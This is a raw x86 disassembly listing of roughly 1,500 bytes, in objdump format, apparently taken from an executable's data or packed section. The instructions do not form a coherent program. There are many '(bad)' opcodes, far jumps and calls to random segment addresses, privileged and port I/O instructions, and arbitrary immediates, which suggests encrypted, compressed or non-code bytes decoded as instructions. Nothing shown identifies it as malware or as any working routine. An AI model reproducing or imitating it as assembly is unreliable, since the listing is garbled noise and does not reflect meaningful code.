  40e5b0:	mov    edi,0xf4d9a54
  40e5b5:	stos   DWORD PTR es:[edi],eax
  40e5b6:	iret   
  40e5b7:	jecxz  0x40e614
  40e5b9:	xlat   BYTE PTR ds:[ebx]
  40e5ba:	adc    bl,BYTE PTR [edi-0x8]
  40e5bd:	xchg   ebp,eax
  40e5be:	test   DWORD PTR [ecx],esi
  40e5c0:	jmp    0xaa0c:0xa8696af1
  40e5c7:	cmp    bh,BYTE PTR [eax+0x3b]
  40e5ca:	or     cl,BYTE PTR [edi+0x7f]
  40e5cd:	sar    ecx,cl
  40e5cf:	lods   eax,DWORD PTR ds:[esi]
  40e5d0:	fisttp DWORD PTR [ebx+edi*8-0x4fdd66a1]
  40e5d7:	sbb    BYTE PTR [esi],bl
  40e5d9:	or     eax,0x92249aa6
  40e5de:	jle    0x40e5d4
  40e5e0:	imul   esp,DWORD PTR [eax+0x77],0x35
  40e5e4:	xchg   ecx,eax
  40e5e5:	or     esp,DWORD PTR [esi-0x53174a35]
  40e5eb:	hlt    
  40e5ec:	cli    
  40e5ed:	push   ebx
  40e5ee:	and    al,BYTE PTR [eax+0x8]
  40e5f1:	xchg   edi,eax
  40e5f2:	xor    dl,BYTE PTR [edi+0x5d]
  40e5f5:	int3   
  40e5f6:	sub    BYTE PTR [edx+0x1d],bl
  40e5f9:	sbb    bl,ch
  40e5fb:	test   eax,0xffea4c8
  40e600:	push   edi
  40e601:	mov    al,ds:0x389635ee
  40e606:	sbb    BYTE PTR [ecx+edx*8],cl
  40e609:	aaa    
  40e60a:	xchg   edi,eax
  40e60b:	jns    0x40e5f6
  40e60d:	fld    DWORD PTR [edi]
  40e60f:	pop    ecx
  40e610:	fst    DWORD PTR [edx-0x35702b85]
  40e616:	outs   dx,DWORD PTR ds:[esi]
  40e617:	pop    edi
  40e618:	jg     0x40e5e2
  40e61a:	xor    al,0xcb
  40e61c:	jmp    0x40e64f
  40e61e:	push   ds
  40e61f:	loop   0x40e63a
  40e621:	int3   
  40e622:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e623:	sbb    DWORD PTR [ecx+0x74],0x7
  40e627:	outs   dx,BYTE PTR ds:[esi]
  40e628:	push   ebx
  40e629:	pusha  
  40e62a:	aas    
  40e62b:	dec    ebp
  40e62c:	stos   DWORD PTR es:[edi],eax
  40e62d:	xchg   ebx,eax
  40e62e:	ret    
  40e62f:	fsub   QWORD PTR [ebx+0x79]
  40e632:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e633:	(bad)  
  40e634:	pop    esi
  40e635:	add    al,0x74
  40e637:	cdq    
  40e638:	mov    edx,?
  40e63a:	sub    BYTE PTR [ebx],bh
  40e63c:	aad    0x19
  40e63e:	mov    cl,BYTE PTR [esi-0x264127d]
  40e644:	ins    DWORD PTR es:[edi],dx
  40e645:	mov    BYTE PTR [edi],bh
  40e647:	xor    edx,ecx
  40e649:	imul   esi,DWORD PTR [esi],0x37
  40e64c:	mov    ch,0xb7
  40e64e:	jb     0x40e613
  40e650:	adc    eax,0x972f4b1e
  40e655:	inc    edi
  40e656:	enter  0x6f46,0x3b
  40e65a:	push   ebx
  40e65b:	sbb    al,BYTE PTR [ebx+edi*1-0x62662014]
  40e662:	xchg   BYTE PTR [edx],dl
  40e664:	push   ds
  40e665:	xchg   esp,eax
  40e666:	xchg   DWORD PTR [ebx],ebp
  40e668:	lea    esi,cs:[edx+0x7d442a24]
  40e66f:	stc    
  40e670:	outs   dx,BYTE PTR ds:[esi]
  40e671:	sahf   
  40e672:	std    
  40e673:	and    eax,0xf96efb80
  40e678:	and    DWORD PTR ds:0xdbe009d2,0x3fde7386
  40e682:	xor    DWORD PTR [edx],esi
  40e684:	adc    eax,0xb0c6cf9d
  40e689:	jge    0x40e67a
  40e68b:	adc    edi,DWORD PTR [ebx+0x5b]
  40e68e:	popa   
  40e68f:	and    BYTE PTR [edx],dl
  40e691:	jno    0x40e711
  40e693:	dec    eax
  40e694:	or     al,0x8b
  40e696:	xor    ebx,DWORD PTR [edx+0x34]
  40e699:	not    DWORD PTR [esi-0x32]
  40e69c:	enter  0x7958,0xba
  40e6a0:	mov    ebx,0x75df44f7
  40e6a5:	dec    edx
  40e6a6:	mov    ebp,ebx
  40e6a8:	(bad)
  40e6ab:	and    al,0x9
  40e6ad:	stc    
  40e6ae:	fsubr  QWORD PTR [eax-0x3c29ecf8]
  40e6b4:	test   BYTE PTR [edx],0x15
  40e6b7:	loop   0x40e6b9
  40e6b9:	sub    BYTE PTR [edi-0x3689f4],ah
  40e6bf:	add    BYTE PTR ds:0x55610af2,dl
  40e6c5:	xor    al,0xb8
  40e6c7:	jmp    0x295a:0x3b76e58
  40e6ce:	pop    ss
  40e6cf:	shr    BYTE PTR [edx-0x3f3ecca],0x5b
  40e6d6:	fstp   TBYTE PTR [edx]
  40e6d8:	jecxz  0x40e6ee
  40e6da:	cdq    
  40e6db:	adc    ebx,DWORD PTR [ebp-0x5754b0eb]
  40e6e1:	retf   0x2d82
  40e6e4:	lds    esi,FWORD PTR [ecx-0x2c]
  40e6e7:	div    ecx
  40e6e9:	pop    edi
  40e6ea:	sbb    bh,al
  40e6ec:	pop    ebp
  40e6ed:	sahf   
  40e6ee:	(bad)  
  40e6f1:	xchg   ebx,eax
  40e6f2:	inc    ebp
  40e6f3:	stc    
  40e6f4:	ds es mov esp,?
  40e6f8:	mov    ds:0x531a78a6,al
  40e6fd:	pop    edi
  40e6fe:	lock paddb mm2,QWORD PTR [edx]
  40e702:	adc    ah,BYTE PTR [eax-0xa]
  40e705:	push   edx
  40e706:	neg    BYTE PTR [ecx-0x20d83dd8]
  40e70c:	and    ch,bl
  40e70e:	mov    dh,0xc4
  40e710:	xchg   ch,cl
  40e712:	add    eax,DWORD PTR [ecx+0x7dc471ee]
  40e718:	mov    esi,0x767f5cb3
  40e71d:	dec    eax
  40e71e:	push   ebx
  40e71f:	call   0x4dad:0xf30ac299
  40e726:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e727:	adc    eax,0xd28070c7
  40e72c:	push   ebp
  40e72d:	ins    BYTE PTR es:[edi],dx
  40e72e:	ror    DWORD PTR [ebx+0x2d87190e],cl
  40e734:	and    dl,BYTE PTR [ebp+0x5f]
  40e737:	pop    ss
  40e738:	test   BYTE PTR [esp+edx*1-0x62],cl
  40e73c:	inc    esi
  40e73d:	ficomp WORD PTR fs:0x9742b15
  40e744:	adc    eax,0xe97c9bf6
  40e749:	jle    0x40e7c7
  40e74b:	out    dx,eax
  40e74c:	enter  0x41d9,0x7c
  40e750:	ds mov ebp,0xed6a955e
  40e756:	cli    
  40e757:	pop    edx
  40e758:	mov    esi,0xea029ca3
  40e75d:	add    DWORD PTR [edx+ecx*1],ecx
  40e760:	sbb    al,0x39
  40e762:	int3   
  40e763:	jnp    0x40e6f8
  40e765:	mov    ecx,0x4d62699d
  40e76a:	popa   
  40e76b:	(bad)  
  40e76c:	sub    ebx,DWORD PTR [esi]
  40e76e:	test   eax,0x206c5a89
  40e773:	mov    BYTE PTR [edi+0x14],ah
  40e776:	cld    
  40e777:	dec    esp
  40e778:	jne    0x40e735
  40e77a:	fwait
  40e77b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e77c:	cmp    DWORD PTR [esi+0x6e],eax
  40e77f:	mov    ch,0x14
  40e781:	push   ss
  40e782:	jp     0x40e7e4
  40e784:	sbb    BYTE PTR [ebp-0x46183d6],dl
  40e78a:	ret    0x9fb3
  40e78d:	dec    eax
  40e78e:	dec    esi
  40e78f:	jp     0x40e7d9
  40e791:	mov    ebp,0x509dec1f
  40e796:	inc    eax
  40e797:	sub    al,0x4c
  40e799:	push   es
  40e79a:	xor    BYTE PTR [eax-0x29599f11],ah
  40e7a0:	fistp  QWORD PTR [ecx+0x18]
  40e7a3:	pop    edx
  40e7a4:	jbe    0x40e803
  40e7a6:	pop    esi
  40e7a7:	daa    
  40e7a8:	test   eax,0x8d02ab39
  40e7ad:	mov    eax,ds:0xa3d54660
  40e7b2:	sar    DWORD PTR [ebp-0x38],1
  40e7b5:	out    0x7,eax
  40e7b7:	arpl   WORD PTR [ecx],dx
  40e7b9:	jmp    eax
  40e7bb:	fdivr  DWORD PTR [esp+eax*8]
  40e7be:	or     eax,0xa0557d43
  40e7c3:	das    
  40e7c4:	retf   0x49c0
  40e7c7:	and    eax,0x70a77702
  40e7cc:	mov    eax,0x54124a90
  40e7d1:	xchg   ecx,eax
  40e7d2:	mov    dh,0xfc
  40e7d4:	sbb    DWORD PTR [esi],0xffffff86
  40e7d7:	sahf   
  40e7d8:	ins    DWORD PTR es:[edi],dx
  40e7d9:	xchg   ebx,eax
  40e7da:	push   ebx
  40e7db:	dec    ebx
  40e7dc:	daa    
  40e7dd:	dec    ecx
  40e7de:	cwde   
  40e7df:	addr16 mov edx,0x66650205
  40e7e5:	into   
  40e7e6:	addr16 jmp 0xb079:0x989e036d
  40e7ee:	scas   al,BYTE PTR es:[edi]
  40e7ef:	aas    
  40e7f0:	pop    ebx
  40e7f1:	or     al,0x4b
  40e7f3:	sbb    ch,ah
  40e7f5:	jno    0x40e7cd
  40e7f7:	dec    esp
  40e7f8:	dec    edx
  40e7f9:	cmp    DWORD PTR [ecx+eiz*2-0x48b576d],edx
  40e800:	add    DWORD PTR [esi+0x63a417d8],0xffffff90
  40e807:	lahf   
  40e808:	mov    ds:0xbf25fc9f,eax
  40e80d:	lea    edi,[eax-0x6f32d1d5]
  40e813:	xor    al,ah
  40e815:	xor    ch,0xda
  40e818:	gs dec ecx
  40e81a:	daa    
  40e81b:	inc    esp
  40e81c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e81d:	mov    bl,0xa2
  40e81f:	sub    al,0x7
  40e821:	iret   
  40e822:	gs mov esi,0x3fc02f7e
  40e828:	xor    al,dl
  40e82a:	jge    0x40e853
  40e82c:	jecxz  0x40e82a
  40e82e:	shr    DWORD PTR [esi],0xb1
  40e831:	push   0x8290fac3
  40e836:	inc    edx
  40e837:	jo     0x40e7da
  40e839:	mov    ch,0x4e
  40e83b:	das    
  40e83c:	je     0x40e826
  40e83e:	arpl   di,bx
  40e840:	xor    edi,DWORD PTR [edi-0x4e]
  40e843:	fnstsw WORD PTR [ebx]
  40e845:	push   esp
  40e846:	xor    BYTE PTR [ecx+ecx*2+0x77ad05a7],bh
  40e84d:	pop    ss
  40e84e:	fst    DWORD PTR ds:0x225df664
  40e854:	pop    es
  40e855:	sti    
  40e856:	stos   DWORD PTR es:[edi],eax
  40e857:	in     al,0x6c
  40e859:	mov    al,ds:0x3b628e0f
  40e85e:	dec    ebp
  40e85f:	pop    ecx
  40e860:	add    DWORD PTR [ebx],ebp
  40e862:	sahf   
  40e863:	jecxz  0x40e8c8
  40e865:	jmp    0x40e7f6
  40e867:	fistp  DWORD PTR [ebx]
  40e869:	(bad)  
  40e86a:	push   ebp
  40e86b:	addr16 mov ds:0xf259,eax
  40e86f:	xor    bl,BYTE PTR [ecx]
  40e871:	push   ss
  40e872:	retf   0x97af
  40e875:	clc    
  40e876:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e877:	xor    ch,0x1e
  40e87a:	jp     0x40e87c
  40e87c:	dec    edx
  40e87d:	pop    ds
  40e87e:	cmp    BYTE PTR [ecx+0x5],0x59
  40e882:	xor    bh,BYTE PTR [ecx-0x24660a9c]
  40e888:	dec    esi
  40e889:	push   esi
  40e88a:	jns    0x40e855
  40e88c:	cmp    BYTE PTR [esi-0x61a97368],cl
  40e892:	dec    ebp
  40e893:	jmp    0xa759711d
  40e898:	pushf  
  40e899:	cwde   
  40e89a:	call   0x2830175d
  40e89f:	call   0x6a7d5cc1
  40e8a4:	xchg   edi,eax
  40e8a5:	fcom   QWORD PTR [edx]
  40e8a7:	add    al,0x7c
  40e8a9:	mov    bh,0x12
  40e8ab:	sbb    DWORD PTR [edi+edi*1-0x52],edx
  40e8af:	cmp    al,0xc2
  40e8b1:	or     al,0xe9
  40e8b3:	mov    al,bh
  40e8b5:	pop    ebx
  40e8b6:	js     0x40e937
  40e8b8:	xor    BYTE PTR [esi+0x3f],0xe6
  40e8bc:	add    al,0x9a
  40e8be:	mov    bl,0xbe
  40e8c0:	push   0xffffffde
  40e8c2:	pop    ebx
  40e8c3:	rol    BYTE PTR [ebx-0x5a6be2e3],0x1e
  40e8ca:	inc    eax
  40e8cb:	rcr    BYTE PTR [edi+0x1e],0xb6
  40e8cf:	sbb    BYTE PTR [ebp-0x52963490],bh
  40e8d5:	fwait
  40e8d6:	or     bl,dl
  40e8d8:	mov    ch,0x3
  40e8da:	fldz   
  40e8dc:	arpl   WORD PTR [edi+0x23],si
  40e8df:	sub    esi,ebp
  40e8e1:	shr    BYTE PTR [ebx+0x64],0xb6
  40e8e5:	or     eax,0x781d87d0
  40e8ea:	push   ebp
  40e8eb:	xor    ah,BYTE PTR [edx+ebx*4-0x641f4c3d]
  40e8f2:	xchg   esi,eax
  40e8f3:	inc    edi
  40e8f4:	cmp    BYTE PTR [edi+0x5068e217],cl
  40e8fa:	fxch   st(5)
  40e8fc:	iret   
  40e8fd:	fadd   DWORD PTR [ebx+eax*8]
  40e900:	fist   WORD PTR [esp+ecx*1+0x19]
  40e904:	push   ebx
  40e905:	jbe    0x40e93c
  40e907:	fistp  QWORD PTR [ecx]
  40e909:	fcmovu st,st(6)
  40e90b:	js     0x40e91b
  40e90d:	in     al,dx
  40e90e:	mov    esi,0xf018873
  40e913:	add    BYTE PTR [edi],ah
  40e915:	fcomp  QWORD PTR [esi+0x47]
  40e918:	xchg   esi,eax
  40e919:	sub    eax,0x11d67f7b
  40e91e:	fidiv  DWORD PTR [esi-0x59df5f6e]
  40e924:	fcom   DWORD PTR [eax-0x1e]
  40e927:	dec    eax
  40e928:	xor    DWORD PTR [ebx],0xff6a900b
  40e92e:	sub    al,0x44
  40e930:	(bad)  
  40e931:	cs dec esi
  40e933:	lods   eax,DWORD PTR ds:[esi]
  40e934:	sub    edx,esp
  40e936:	adc    bl,BYTE PTR [ecx+0x7c]
  40e939:	jno    0x40e8ca
  40e93b:	add    ecx,DWORD PTR [edi+ebp*4]
  40e93e:	jl     0x40e91f
  40e940:	icebp  
  40e941:	jns    0x40e8db
  40e943:	xor    ah,dl
  40e945:	and    DWORD PTR [eax],ebp
  40e947:	sub    esp,DWORD PTR [ebx]
  40e949:	sub    eax,DWORD PTR [esi]
  40e94b:	push   ebp
  40e94c:	cmp    eax,0x5302e892
  40e951:	dec    edx
  40e952:	arpl   WORD PTR [edi-0x2d38b687],bp
  40e958:	adc    al,0xb1
  40e95b:	mov    ebp,0x60893a1e
  40e960:	(bad)  
  40e961:	cmp    eax,0xb3187f42
  40e966:	add    esi,DWORD PTR [edx]
  40e968:	pop    ss
  40e969:	mov    dl,0xd3
  40e96b:	or     ebp,DWORD PTR [ecx-0x64]
  40e96e:	std    
  40e96f:	(bad)  
  40e970:	sbb    DWORD PTR [esi+0x50f0e0a4],ebp
  40e976:	jg     0x40e9a9
  40e978:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e97a:	fdivr  DWORD PTR [esi]
  40e97c:	xchg   ebp,eax
  40e97d:	vmread ecx,esi
  40e980:	stos   DWORD PTR es:[edi],eax
  40e981:	add    DWORD PTR [esi+0x77bb2009],0xfffffff6
  40e988:	push   0xff707308
  40e98d:	and    esi,ebp
  40e98f:	push   esp
  40e990:	sub    eax,0x2cc9c60
  40e995:	in     eax,dx
  40e996:	sbb    cl,BYTE PTR ds:0xa69744cc
  40e99c:	mov    BYTE PTR [edx],cl
  40e99e:	(bad)  
  40e9a0:	(bad)  
  40e9a1:	retf   0xc3d1
  40e9a4:	and    eax,0xf25d2440
  40e9a9:	fbld   TBYTE PTR [ebx]
  40e9ab:	adc    eax,0x51d71d0b
  40e9b0:	stc    
  40e9b1:	push   edi
  40e9b2:	in     al,0x50
  40e9b4:	push   edx
  40e9b5:	ds inc edi
  40e9b7:	bound  esp,QWORD PTR [esi+0x33]
  40e9ba:	sub    eax,0x62c3be83
  40e9bf:	aaa    
  40e9c0:	out    dx,eax
  40e9c1:	or     al,0x13
  40e9c3:	and    eax,0xfc8b7c4d
  40e9c8:	xor    bh,bl
  40e9ca:	inc    ebp
  40e9cb:	mov    edi,DWORD PTR [ebx-0x51]
  40e9ce:	lods   al,BYTE PTR ds:[esi]
  40e9cf:	ret    0xf2ef
  40e9d2:	adc    dl,BYTE PTR [edx-0x68]
  40e9d5:	push   esi
  40e9d6:	bsr    esp,DWORD PTR [ebp-0x515fbe6d]
  40e9dd:	gs data16 mov ch,0xec
  40e9e1:	xchg   edx,eax
  40e9e2:	mov    ebp,DWORD PTR [ecx-0x13]
  40e9e5:	mov    eax,0x91a41a54
  40e9ea:	dec    eax
  40e9eb:	jl     0x40ea2b
  40e9ed:	(bad)  
  40e9ee:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e9ef:	aaa    
  40e9f0:	lahf   
  40e9f1:	cmp    esp,DWORD PTR [ecx]
  40e9f3:	inc    ecx
  40e9f5:	push   edi
  40e9f6:	test   BYTE PTR [ecx+0x29],0x2c
  40e9fa:	sbb    cl,BYTE PTR [esi+ebx*2-0x42]
  40e9fe:	mov    al,0x11
  40ea00:	pop    ebp
  40ea01:	pop    ebx
  40ea02:	adc    eax,0x4653804b
  40ea07:	jns    0x40ea23
  40ea09:	test   DWORD PTR [esi-0x24fea72c],esp
  40ea0f:	jmp    0x4aa0:0x76968c01
  40ea16:	popf   
  40ea17:	dec    edi
  40ea18:	cdq    
  40ea19:	add    DWORD PTR [edx+0x6],eax
  40ea1c:	ds ss loope 0x40ea01
  40ea20:	lea    esi,[edi+0x2c0c734c]
  40ea26:	in     al,0xd0
  40ea28:	sbb    al,0x64
  40ea2a:	jno    0x40eaa0
  40ea2c:	mov    ebx,0x58ef64f5
  40ea31:	or     ah,BYTE PTR [eax]
  40ea33:	sbb    DWORD PTR [ebx-0xe1bd4cc],ebp
  40ea39:	loop   0x40ea3c
  40ea3b:	in     eax,0xdf
  40ea3d:	or     eax,0x2913851e
  40ea42:	cmp    ch,bh
  40ea44:	jno    0x40eab0
  40ea46:	and    BYTE PTR [ebx],bh
  40ea48:	add    esi,DWORD PTR [edi]
  40ea4a:	dec    ecx
  40ea4b:	clc    
  40ea4c:	hlt    
  40ea4d:	pop    eax
  40ea4e:	pop    ds
  40ea4f:	addr16 jae 0x40ea89
  40ea52:	call   0x13e9:0xeeb0c966
  40ea59:	pop    esi
  40ea5a:	push   0xe
  40ea5c:	dec    ebp
  40ea5d:	lahf   
  40ea5e:	cmp    cl,al
  40ea60:	aam    0x70
  40ea62:	aad    0xaf
  40ea64:	mov    esp,0x4f48d3e7
  40ea69:	imul   ecx,DWORD PTR [ebp-0x47],0x75
  40ea6d:	xlat   BYTE PTR ds:[ebx]
  40ea6e:	mov    ds:0x4217120c,eax
  40ea73:	pop    edi
  40ea74:	mov    esi,esp
  40ea76:	out    dx,al
  40ea77:	push   ds
  40ea78:	push   esi
  40ea79:	scas   eax,DWORD PTR es:[edi]
  40ea7a:	xor    al,cl
  40ea7c:	pop    esi
  40ea7d:	dec    ebx
  40ea7e:	cmp    DWORD PTR [ebp-0x3cbf63e0],0xe
  40ea85:	add    esi,DWORD PTR [edi]
  40ea87:	dec    ebx
  40ea88:	icebp  
  40ea89:	jno    0x40eadb
  40ea8b:	pushf  
  40ea8c:	sub    BYTE PTR [esp+eax*8],dl
  40ea8f:	lods   al,BYTE PTR ds:[esi]
  40ea90:	inc    eax
  40ea91:	fwait
  40ea92:	sar    BYTE PTR [eax+ecx*1+0x6c639b7a],cl
  40ea99:	push   ds
  40ea9a:	sbb    eax,0xd9ef4988
  40ea9f:	fsubr  QWORD PTR [esp+ebx*8-0x7e]
  40eaa3:	(bad)  
  40eaa4:	xor    DWORD PTR [ecx-0x2d],ebp
  40eaa7:	sbb    eax,0xec9d3da6
  40eaac:	inc    eax
  40eaad:	jle    0x40ea77
  40eaaf:	(bad)  
  40eab0:	retf   0x3fdc
  40eab3:	scas   al,BYTE PTR es:[edi]
  40eab4:	retf   
  40eab5:	stos   BYTE PTR es:[edi],al
  40eab6:	jno    0x40eadf
  40eab8:	and    eax,0x39811fb4
  40eabd:	jmp    0x3cb038ea
  40eac2:	adc    ecx,ebp
  40eac4:	clc    
  40eac5:	cmp    ebx,DWORD PTR [edx-0x304f1ad5]
  40eacb:	add    BYTE PTR [edx-0x70],bh
  40eace:	mov    dh,bl
  40ead0:	push   edx
  40ead1:	jb     0x40eaca
  40ead3:	clc    
  40ead4:	enter  0xe457,0xe1
  40ead8:	daa    
  40ead9:	and    DWORD PTR [ecx-0x7a],esi
  40eadc:	and    edi,esi
  40eade:	cs test edi,ecx
  40eae1:	jae    0x40ead5
  40eae3:	cmc    
  40eae4:	pushf  
  40eae5:	inc    edx
  40eae6:	cli    
  40eae7:	je     0x40eaef
  40eae9:	cmp    dl,BYTE PTR ds:0x550241a1
  40eaef:	xor    eax,edi
  40eaf1:	push   ebp
  40eaf2:	retf   
  40eaf3:	scas   eax,DWORD PTR es:[edi]
  40eaf4:	aas    
  40eaf5:	rcr    BYTE PTR [esp+ebx*1],1
  40eaf8:	hlt    
  40eaf9:	mov    ah,0x3d
  40eafb:	jno    0x40eaba
  40eafd:	shr    BYTE PTR [eax],0xa4
  40eb00:	sbb    al,0xb8
  40eb02:	das    
  40eb03:	call   0xb590:0xa451fb7b
  40eb0a:	xlat   BYTE PTR ds:[ebx]
  40eb0b:	jns    0x40eb2d
  40eb0d:	in     eax,dx
  40eb0e:	pushf  
  40eb0f:	cmp    eax,eax
  40eb11:	inc    esp
  40eb12:	call   0x11bd:0xf993ff6
  40eb19:	sahf   
  40eb1a:	(bad)  
  40eb1c:	mov    esi,0xecec3439
  40eb21:	(bad)  
  40eb22:	pop    ebx
  40eb23:	fwait
  40eb24:	and    DWORD PTR [ebp+0x41],ebx
  40eb27:	lods   al,BYTE PTR ds:[esi]
  40eb28:	dec    ebp
  40eb29:	sub    eax,DWORD PTR [eax-0x72]
  40eb2c:	xchg   ebx,eax
  40eb2d:	push   ss
  40eb2e:	or     edx,DWORD PTR [eax]
  40eb30:	dec    ecx
  40eb31:	add    cl,al
  40eb33:	test   BYTE PTR [ecx-0x1bd1ab50],0x39
  40eb3a:	xor    BYTE PTR [ecx],cl
  40eb3c:	sbb    bh,cl
  40eb3e:	lods   eax,DWORD PTR ds:[esi]
  40eb3f:	push   es
  40eb40:	out    0xfc,eax
  40eb42:	sbb    bh,BYTE PTR [esp+ebx*1]
  40eb45:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40eb46:	add    bh,ch
  40eb48:	(bad)  
  40eb49:	enter  0x3616,0x3c
  40eb4d:	inc    ebx
  40eb4e:	cmp    al,BYTE PTR [ebx+0x15]
  40eb51:	or     BYTE PTR [eax+ebx*4],ch
  40eb54:	sahf   
  40eb55:	cdq    
  40eb56:	inc    ebp
  40eb57:	sub    dl,al
  40eb59:	inc    ebx
  40eb5a:	xor    BYTE PTR [ebp-0x24],ah
  40eb5d:	push   ebx
  40eb5e:	sub    al,0xb6
  40eb60:	fist   WORD PTR [ecx-0x5]
  40eb63:	pop    ebx
  40eb64:	sbb    BYTE PTR [edi+0x76],dl
  40eb67:	aam    0xee
  40eb69:	mov    edx,0x7f77f985
  40eb6e:	or     ecx,eax
  40eb70:	cvtpi2ps xmm6,QWORD PTR [ebx]
  40eb73:	sub    cl,dh
  40eb75:	leave  
  40eb76:	jmp    0x9978:0x5376d9da
  40eb7d:	pop    ecx
  40eb7e:	retf   
  40eb7f:	aam    0x9f
  40eb81:	lahf   
  40eb82:	jmp    0xe6f4:0x596b3f03
  40eb89:	jno    0x40eb5a
  40eb8b:	fadd   st,st(5)
  40eb8d:	imul   ebx,ebp,0x2d0bdc78
  40eb93:	aas    
  40eb94:	loopne 0x40eb8c
  40eb96:	sub    al,0x97
  40eb98:	push   ds
  40eb99:	inc    esi
  40eb9a:	(bad)  
  40eb9b:	hlt    
  40eb9c:	nop
  40eb9d:	or     edx,DWORD PTR [edi+0x46f5a1f0]
  40eba3:	fcomp  QWORD PTR [edx-0x2af29a30]
  40eba9:	inc    ebx
  40ebaa:	sbb    BYTE PTR [ebx],dh
  40ebac:	(bad)  
  40ebad:	sbb    al,0xd2
  40ebaf:	imul   ebp,DWORD PTR [ebx-0x333096b4],0x1c
  40ebb6:	xlat   BYTE PTR ds:[ebx]
  40ebb7:	push   eax
  40ebb8:	cli    
  40ebb9:	cmp    BYTE PTR [bx+si-0x6f80],dl
  40ebbe:	repz push esp
  40ebc0:	scas   eax,DWORD PTR es:[edi]
  40ebc1:	in     al,0x2c
  40ebc3:	aas    
  40ebc4:	push   0xffffffb6
  40ebc6:	outs   dx,BYTE PTR ds:[esi]
  40ebc7:	clc    
  40ebc8:	je     0x40ec17
  40ebca:	or     DWORD PTR [esi+0x6c],edi
  40ebcd:	pop    es
  40ebce:	add    eax,0x9fae3d29
  40ebd3:	mov    esi,0xe6f1da31
  40ebd8:	not    BYTE PTR [edi-0x21368774]
  40ebde:	inc    edi
  40ebdf:	data16 sahf 
  40ebe1:	mov    esp,0xcda02aca
  40ebe6:	push   esi
  40ebe7:	fst    DWORD PTR [ebp+0x43fcfa9d]
  40ebed:	and    bl,BYTE PTR ds:0x7387379c
  40ebf3:	xor    eax,0x8c8a41f6
  40ebf8:	(bad)  
  40ebf9:	dec    esi
  40ebfa:	pusha  
  40ebfb:	shr    BYTE PTR [edx+0xc],0xa9
  40ebff:	hlt    
  40ec00:	sbb    esp,DWORD PTR [ebp-0x3d1b5181]
  40ec06:	out    0xa6,al
  40ec08:	(bad)  
  40ec09:	jbe    0x40ec24
  40ec0b:	push   esi
  40ec0c:	jp     0x40ec53
  40ec0e:	lods   eax,DWORD PTR ds:[esi]
  40ec0f:	enter  0xf185,0xd0
  40ec13:	test   BYTE PTR [ecx],bh
  40ec15:	sti    
  40ec16:	fdivr  st(6),st
  40ec18:	hlt    
  40ec19:	mov    dh,0x98
  40ec1b:	mov    edx,0x189aa8b3
  40ec20:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ec21:	adc    eax,0xc309833c
  40ec26:	and    DWORD PTR ds:0x323ca661,esp
  40ec2c:	aam    0xe8
  40ec2e:	xchg   ecx,eax
  40ec2f:	jb     0x40ec53
  40ec31:	push   es
  40ec32:	test   eax,0x8eb160dc
  40ec37:	shl    DWORD PTR [ebx+0x59],0x4f
  40ec3b:	ror    bh,1
  40ec3d:	pop    eax
  40ec3e:	xlat   BYTE PTR ds:[ebx]
  40ec3f:	stc    
  40ec40:	arpl   WORD PTR ds:0xc3edb04a,dx
  40ec46:	loopne 0x40ec54
  40ec48:	fcmovb st,st(3)
  40ec4a:	outs   dx,DWORD PTR ds:[esi]
  40ec4b:	(bad)  
  40ec4c:	adc    al,0xe1
  40ec4e:	dec    ecx
  40ec4f:	loopne 0x40ecbf
  40ec51:	sbb    esi,DWORD PTR ds:0x868aaf81
  40ec57:	repnz out dx,eax
  40ec59:	push   ebp
  40ec5a:	xchg   edi,eax
  40ec5b:	inc    ecx
  40ec5c:	jnp    0x40eca8
  40ec5e:	les    esp,FWORD PTR [ecx+0x7b7f1875]
  40ec64:	iret   
  40ec65:	adc    ebx,DWORD PTR [edi+0x3c]
  40ec68:	or     ebp,DWORD PTR [ebx+0xd43a128]
  40ec6e:	les    edx,FWORD PTR [eax-0x1d]
  40ec71:	mov    ah,0x73
  40ec73:	lahf   
  40ec74:	and    esi,DWORD PTR [ebp-0x7d]
  40ec77:	jge    0x40ec9d
  40ec79:	je     0x40ec24
  40ec7b:	adc    BYTE PTR [edx+edi*8+0x1e],0xac
  40ec80:	cmp    BYTE PTR [edx-0x5c248408],bh
  40ec86:	jp     0x40ec88
  40ec88:	fsubr  QWORD PTR [eax]
  40ec8a:	fnsave [esi-0x261850f]
  40ec90:	xchg   ebp,eax
  40ec91:	dec    edi
  40ec92:	mov    ebp,0x3726d8e6
  40ec97:	push   0xd0bc7e86
  40ec9c:	scas   al,BYTE PTR es:[edi]
  40ec9d:	gs icebp 
  40ec9f:	jmp    0xf8c77ab6
  40eca4:	dec    eax
  40eca5:	scas   eax,DWORD PTR es:[edi]
  40eca6:	dec    ebp
  40eca7:	or     eax,0x4bc96cb2
  40ecac:	pop    esi
  40ecad:	xor    DWORD PTR [edi+0x3c],esp
  40ecb0:	into   
  40ecb1:	aaa    
  40ecb2:	push   0x8bc0b863
  40ecb7:	or     dl,dl
  40ecb9:	stos   BYTE PTR es:[edi],al
  40ecba:	inc    edx
  40ecbb:	mul    BYTE PTR [esi+0x60085eac]
  40ecc1:	add    eax,0x62aa6f6
  40ecc6:	stos   BYTE PTR es:[edi],al
  40ecc7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ecc8:	icebp  
  40ecc9:	push   edx
  40ecca:	push   esp
  40eccb:	fwait
  40eccc:	cmp    DWORD PTR [ebx+0x7aea53df],esp
  40ecd2:	(bad)
  40ecd6:	fwait
  40ecd7:	sub    al,0xf4
  40ecd9:	les    esi,FWORD PTR [edx-0x2d]
  40ecdc:	stos   BYTE PTR es:[edi],al
  40ecdd:	das    
  40ecde:	das    
  40ecdf:	pop    ebp
  40ece0:	xchg   ebx,eax
  40ece1:	jecxz  0x40eceb
  40ece3:	sbb    edx,DWORD PTR [ebp+0x6d]
  40ece6:	xor    al,0x30
  40ece8:	push   ss
  40ece9:	imul   ebx,DWORD PTR [esi],0x18
  40ecec:	inc    esi
  40eced:	aad    0x6d
  40ecef:	sub    BYTE PTR [ebp+ebx*4-0x291f970e],bh
